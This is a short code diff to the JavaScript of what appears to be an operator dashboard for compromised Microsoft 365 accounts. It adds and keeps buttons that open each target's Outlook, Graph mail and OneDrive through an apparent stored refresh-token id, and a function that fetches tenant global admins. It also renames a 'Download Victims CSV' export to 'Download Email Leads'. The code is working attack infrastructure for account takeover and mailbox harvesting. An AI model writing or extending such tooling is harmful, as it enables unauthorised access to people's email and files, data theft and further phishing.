@@ -402,7 +402,7 @@ function openProfile(tid, email, rtId) {
         html += '<a class="action-btn outlook" onclick="openOutlook('+tid+','+(rtId||0)+')" style="font-size:12px">Open Outlook</a>';
         html += '<a class="action-btn" style="border-color:rgba(14,165,233,0.3);color:#0ea5e9;font-size:12px" onclick="openOutlookGraph('+tid+','+(rtId||0)+')">Outlook Graph</a>';
         html += '<a class="action-btn drive" onclick="openDrive('+tid+','+(rtId||0)+')" style="font-size:12px">OneDrive</a>';
-        html += '<a class="action-btn" style="border-color:rgba(212,168,83,0.3);color:var(--gs-gold);font-size:12px" href="/api/download_victims_csv" target="_blank">Download Victims CSV</a>';
+        html += '<a class="action-btn" style="border-color:rgba(212,168,83,0.3);color:var(--gs-gold);font-size:12px" href="/api/download_email_leads/' + encodeURIComponent(email) + '" target="_blank">Download Email Leads</a>';
         html += '</div>';
 
         // Country flag
@@ -486,8 +486,7 @@ function openProfile(tid, email, rtId) {
 
 function countryToFlag(code) {
     if (!code || code.length !== 2) return '';
-    var a = 0x1F1E6;
-    return String.fromCodePoint(a + code.charCodeAt(0) - 65) + String.fromCodePoint(a + code.charCodeAt(1) - 65);
+    return '<img src="https://flagcdn.com/20x15/' + code.toLowerCase() + '.png" width="20" height="15" style="vertical-align:middle" alt="' + code + '" onerror="this.style.display=\'none\'">';
 }
 
 function fetchGlobalAdmins(tid, retries, email) {
